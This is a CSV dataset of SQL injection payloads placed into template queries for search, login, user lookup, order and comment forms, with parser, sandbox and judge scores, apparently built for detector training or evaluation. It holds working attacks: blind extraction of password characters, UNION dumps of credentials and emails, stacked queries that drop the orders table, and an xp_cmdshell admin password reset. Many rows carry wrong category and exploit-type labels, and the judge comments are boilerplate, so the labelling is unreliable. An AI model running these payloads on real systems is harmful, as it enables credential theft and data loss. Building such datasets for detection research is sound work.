query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00016,1' AND SLEEP(5)--,SELECT * FROM products WHERE name LIKE '%1' AND SLEEP(5)--%',tautology,search,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""Anonymous"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00017,1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --,SELECT * FROM products WHERE name LIKE '%1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --%',tautology,search,1,0,0.0,True,default,"[""If"", ""Column"", ""Paren"", ""Identifier"", ""Case"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00019,1'--%23,SELECT * FROM products WHERE name LIKE '%1'--%23%',tautology,search,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00020,1'%3B/**/OR/**/'1'='1,SELECT * FROM products WHERE name LIKE '%1'%3B/**/OR/**/'1'='1%',tautology,search,1,0,0.0,True,mysql,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Mod"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00022,"1' OR ASCII(SUBSTRING((SELECT password FROM users WHERE id = 1), 1, 1)) > 97 --","SELECT * FROM users WHERE id = 1' OR ASCII(SUBSTRING((SELECT password FROM users WHERE id = 1), 1, 1)) > 97 --",tautology,user_lookup,1,0,0.0,True,default,"[""Column"", ""Ascii"", ""Or"", ""Identifier"", ""GT"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00023,' OR EXISTS(SELECT * FROM users WHERE id IS NULL OR id IS NOT NULL),SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM users WHERE id IS NULL OR id IS NOT NULL),tautology,user_lookup,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Not"", ""Is"", ""Where"", ""Null"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00025,1' AND (SELECT COUNT(*) FROM users WHERE CAST(id AS VARCHAR(10)) LIKE '%') = 1 --,SELECT * FROM users WHERE id = 1' AND (SELECT COUNT(*) FROM users WHERE CAST(id AS VARCHAR(10)) LIKE '%') = 1 --,tautology,user_lookup,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""DataType"", ""Select"", ""Subquery"", ""Table"", ""Like"", ""Star"", ""Cast"", ""EQ"", ""From"", ""DataTypeParam"", ""Literal"", ""Count""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00026,1' OR 1=(CASE WHEN (SELECT username FROM users WHERE id = 1 LIMIT 1)='admin' THEN 1 ELSE 0 END) --,SELECT * FROM users WHERE id = 1' OR 1=(CASE WHEN (SELECT username FROM users WHERE id = 1 LIMIT 1)='admin' THEN 1 ELSE 0 END) --,tautology,user_lookup,1,0,0.0,True,default,"[""If"", ""Column"", ""Or"", ""Paren"", ""Identifier"", ""Case"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""Limit"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00027,' OR 1=1 #,SELECT * FROM users WHERE id = ' OR 1=1 #,tautology,user_lookup,1,0,0.0,True,mysql,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00028,' OR 1>1 AND '1'='1',SELECT * FROM users WHERE id = ' OR 1>1 AND '1'='1',tautology,user_lookup,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""GT"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00029,"' OR ASCII(SUBSTRING(username,1,1)) < 110 --","SELECT * FROM users WHERE id = ' OR ASCII(SUBSTRING(username,1,1)) < 110 --",tautology,user_lookup,1,0,0.0,True,default,"[""Column"", ""Ascii"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""LT"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00031,"' OR CAST(SUBSTRING(password, 1, 1) AS UNSIGNED) > 97 --","SELECT * FROM users WHERE id = ' OR CAST(SUBSTRING(password, 1, 1) AS UNSIGNED) > 97 --",tautology,user_lookup,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""GT"", ""Where"", ""Select"", ""DataType"", ""Table"", ""Star"", ""Cast"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00032,; EXEC('xp_cmdshell net user admin NewPass123');--,SELECT * FROM users WHERE id = ; EXEC('xp_cmdshell net user admin NewPass123');--,tautology,user_lookup,1,0,0.0,True,default,"[""Semicolon"", ""Literal"", ""Anonymous""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00033,"' OR EXISTS(SELECT * FROM sysobjects WHERE xtype='U' AND name IN ('users', 'user_info')) AND CAST(COUNT(*) AS CHAR) != 0 --","SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM sysobjects WHERE xtype='U' AND name IN ('users', 'user_info')) AND CAST(COUNT(*) AS CHAR) != 0 --",tautology,user_lookup,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""In"", ""NEQ"", ""And"", ""DataType"", ""Select"", ""Table"", ""Star"", ""Cast"", ""EQ"", ""Exists"", ""From"", ""Literal"", ""Count""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00034,1' AND 1=1 --,SELECT * FROM orders WHERE status = '1' AND 1=1 --' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00036,'; DROP TABLE orders; --,SELECT * FROM orders WHERE status = ''; DROP TABLE orders; --' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,"[""Column"", ""Semicolon"", ""Identifier"", ""Drop"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00037,' OR 1+1=2 --,SELECT * FROM orders WHERE status = '' OR 1+1=2 --' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Add"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00038,-- OR 'a'='a',SELECT * FROM orders WHERE status = '-- OR 'a'='a'' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00039,' OR (SELECT 1 FROM users WHERE username = 'admin')--,SELECT * FROM orders WHERE status = '' OR (SELECT 1 FROM users WHERE username = 'admin')--' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00040,""" OR ""username"" = 'admin' AND ""password"" = ''""","SELECT * FROM orders WHERE status = '"" OR ""username"" = 'admin' AND ""password"" = ''""' ORDER BY date DESC",tautology,order_filter,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00042,--' AND 1=1,"INSERT INTO comments (user_id, body) VALUES (1, '--' AND 1=1')",tautology,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00043,"UNION/**/SELECT/**/NULL,/**/'注入成功'--","INSERT INTO comments (user_id, body) VALUES (1, 'UNION/**/SELECT/**/NULL,/**/'注入成功'--')",tautology,comment_insert,1,0,0.0,True,default,"[""Union"", ""Identifier"", ""Where"", ""Null"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00044,--') OR 1=1 --,"INSERT INTO comments (user_id, body) VALUES (1, '--') OR 1=1 --')",tautology,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00045,' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--')",tautology,comment_insert,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00046,' OR CAST((SELECT 1 FROM information_schema.tables WHERE table_name='users') AS VARCHAR)--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR CAST((SELECT 1 FROM information_schema.tables WHERE table_name='users') AS VARCHAR)--')",tautology,comment_insert,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""DataType"", ""Subquery"", ""Table"", ""Star"", ""Cast"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00047,"' OR IF(1=1, (SELECT body FROM comments WHERE user_id=1), '')--","INSERT INTO comments (user_id, body) VALUES (1, '' OR IF(1=1, (SELECT body FROM comments WHERE user_id=1), '')--')",tautology,comment_insert,1,0,0.0,True,default,"[""If"", ""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00048,"' OR CONCAT('x','y') LIKE CONCAT('x', (SELECT '1' FROM dual))--","INSERT INTO comments (user_id, body) VALUES (1, '' OR CONCAT('x','y') LIKE CONCAT('x', (SELECT '1' FROM dual))--')",tautology,comment_insert,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Concat"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Like"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00050,--/*'*/ OR '1'='1',"INSERT INTO comments (user_id, body) VALUES (1, '--/*'*/ OR '1'='1'')",tautology,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00051,"' UNION SELECT 'x', 'y'","INSERT INTO comments (user_id, body) VALUES (1, '' UNION SELECT 'x', 'y'')",tautology,comment_insert,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00052,"[""' OR 1=1 --""","SELECT * FROM users WHERE username = '[""' OR 1=1 --""' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00054,"OR SUBSTRING(username, 1, 1)='a' --""","SELECT * FROM users WHERE username = 'OR SUBSTRING(username, 1, 1)='a' --""' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00056,' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='users')--,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='users')--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00058,'; SELECT pg_sleep(10);--,SELECT * FROM users WHERE username = ''; SELECT pg_sleep(10);--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Column"", ""Semicolon"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""Anonymous"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00059,' OR (SELECT 1 FROM users ORDER BY id LIMIT 1) = 1 --,SELECT * FROM users WHERE username = '' OR (SELECT 1 FROM users ORDER BY id LIMIT 1) = 1 --' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""Order"", ""Limit"", ""EQ"", ""From"", ""Ordered"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00060,"'; INSERT INTO logs VALUES('injection','admin');--","SELECT * FROM users WHERE username = ''; INSERT INTO logs VALUES('injection','admin');--' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Column"", ""Tuple"", ""Semicolon"", ""Identifier"", ""Where"", ""Insert"", ""Select"", ""Table"", ""Values"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00061,"' UNION SELECT username, password FROM admin.users --","SELECT * FROM users WHERE username = '' UNION SELECT username, password FROM admin.users --' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00062,""" OR username LIKE '%a%' AND password LIKE '%b%' --","SELECT * FROM users WHERE username = '"" OR username LIKE '%a%' AND password LIKE '%b%' --' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Like"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00063,"' OR ASCII(SUBSTRING(password, 1, 1)) = 97 AND ASCII(SUBSTRING(password, 2, 1)) = 98 --","SELECT * FROM users WHERE username = '' OR ASCII(SUBSTRING(password, 1, 1)) = 97 AND ASCII(SUBSTRING(password, 2, 1)) = 98 --' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Column"", ""Ascii"", ""Or"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00064,"' AND (SELECT COUNT(*) FROM users WHERE password = SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1)) > 0 --","SELECT * FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM users WHERE password = SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1)) > 0 --%'",union_based,search,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""GT"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring"", ""Count""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00066,' OR (SELECT 1 FROM (SELECT 1 FROM users WHERE username = 'admin')) = 1 --,SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (SELECT 1 FROM users WHERE username = 'admin')) = 1 --%',union_based,search,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00067,' AND (SELECT 1 FROM (SELECT 2 AS num FROM users WHERE username = 'admin' INTERSECT SELECT 1 AS num FROM dual)) = 1 --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM (SELECT 2 AS num FROM users WHERE username = 'admin' INTERSECT SELECT 1 AS num FROM dual)) = 1 --%',union_based,search,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Intersect"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""From"", ""Alias"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00068,"' UNION SELECT username,password FROM users --","SELECT * FROM products WHERE name LIKE '%' UNION SELECT username,password FROM users --%'",union_based,search,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00069,"(SELECT ' UNION SELECT name,email FROM customer' FROM dual)","SELECT * FROM products WHERE name LIKE '%(SELECT ' UNION SELECT name,email FROM customer' FROM dual)%'",union_based,search,1,0,0.0,True,default,"[""Identifier"", ""Select"", ""Table"", ""Subquery"", ""From"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00071,' OR EXISTS(SELECT * FROM admin WHERE level='high')--,SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT * FROM admin WHERE level='high')--%',union_based,search,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00074,"' UNION ALL SELECT table_name, column_name FROM information_schema.columns --","SELECT * FROM products WHERE name LIKE '%' UNION ALL SELECT table_name, column_name FROM information_schema.columns --%'",union_based,search,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00075,"1' UNION SELECT username, password FROM admin --","SELECT * FROM users WHERE id = 1' UNION SELECT username, password FROM admin --",union_based,user_lookup,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00076,"1'/* */ UNION /* */SELECT email, phone FROM contacts#","SELECT * FROM users WHERE id = 1'/* */ UNION /* */SELECT email, phone FROM contacts#",union_based,user_lookup,1,0,0.0,True,mysql,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00077,1' AND EXISTS(SELECT 1 FROM sysobjects WHERE name='users')--,SELECT * FROM users WHERE id = 1' AND EXISTS(SELECT 1 FROM sysobjects WHERE name='users')--,union_based,user_lookup,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
